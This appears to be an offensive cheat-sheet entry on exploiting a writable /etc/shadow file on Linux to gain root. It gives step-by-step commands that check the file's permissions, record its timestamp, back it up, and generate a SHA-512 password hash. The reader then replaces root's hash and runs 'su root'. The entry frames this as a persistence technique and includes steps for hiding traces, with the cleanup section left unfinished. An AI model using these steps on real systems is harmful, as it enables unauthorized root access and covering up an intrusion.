## Weak File Permissions - Writable `/etc/shadow`

Nowadays most modern Linux servers and desktops currently are most up-to-date and I can say you'll never find it. Yet you can use this method as a persistence technique yet it's not OPSEC safe to do so but hey you'll might need it under certain circumstances.

## 01 - Detect

```
$ ls -l /etc/shadow
```

## 02 - Exploit

Before resetting the password. Take note of the timestamp to clear traces ahead of time.

```
$ stat /etc/shadow
```

Backup the shadow file. To clear traces ahead of time.

```
$ cp /etc/shadow /tmp/shadow.bak && sudo chmod o+r /etc/shadow
```

### 2.1 - Overwrite Password via Hash Digest

#### 2.1.1 - Mkpasswd

```
$ mkpasswd -m sha-512 newpass1234
```

#### 2.1.2 - Python Crypt Module

```
$ python -c 'import crypt; print(crypt.crypt("newpass1234", "$6$salt"))'
```

Then edit the shadow file `root:<sha512crypt_hash>:17298:0:99999:7:::` replace the old `<sha512crypt_hash>` which starts with `$6$` into a new one that was previously generated.

Then try to authenticate and you're root.

```
$ su root
```

## 03 - Cleanup

TODO: Fill in this info

```
$ touch
```
